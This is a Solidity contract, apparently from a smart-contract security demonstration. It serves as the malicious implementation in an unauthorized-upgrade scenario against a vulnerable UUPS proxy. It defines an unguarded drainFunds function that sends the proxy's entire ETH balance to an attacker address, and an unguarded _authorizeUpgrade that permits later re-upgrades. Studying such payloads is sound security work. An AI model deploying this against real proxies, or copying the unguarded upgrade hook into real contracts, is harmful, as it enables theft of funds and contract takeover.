// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

/**
 * @title MaliciousImpl
 * @notice ATTACK PAYLOAD: Deployed by an attacker after exploiting {VulnerableUUPS}.
 * @dev Used in Scenario 3 (Unauthorized Upgrade). Once the attacker has upgraded
 *      a vulnerable UUPS proxy to point here, drainFunds() lets any caller empty
 *      the proxy's ETH balance to an attacker-controlled recipient.
 *
 * DESIGN NOTES:
 * 1. Storage layout deliberately matches {VulnerableUUPS} (value: uint256 at slot 0)
 *    so the existing state is not corrupted by the malicious upgrade. The attack
 *    is about *adding* the drainFunds method, not about wrecking existing state.
 * 2. _authorizeUpgrade is left unguarded so the attacker can re-upgrade later
 *    (e.g. to wipe traces). This is the worst-case payload, not a defensive design.
 * 3. No constructor protection — this contract is never deployed behind its own
 *    proxy; it's strictly the destination of a malicious upgrade.
 */
contract MaliciousImpl is Initializable, UUPSUpgradeable {
    /// @notice Mirror of {VulnerableUUPS}'s slot 0 so storage layout is preserved.
    uint256 public value;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {}

    /**
     * @notice Initialize the implementation.
     * @dev OZ v5: UUPSUpgradeable is @custom:stateless (no __UUPSUpgradeable_init).
     */
    function initialize() public initializer {}

    /**
     * @notice ATTACK: Drain the entire ETH balance held by the proxy.
     * @param recipient The attacker-controlled address that receives the funds.
     * @dev Intentionally has no access control — the attacker is the caller, so
     *      gating this would only hurt the attacker. Demonstrates worst-case impact.
     */
    function drainFunds(address payable recipient) external {
        recipient.transfer(address(this).balance);
    }

    /**
     * @notice Authorization check for upgrades.
     * @dev Unguarded on purpose so the attacker can re-upgrade (no defensive intent).
     */
    function _authorizeUpgrade(address) internal override {}
}
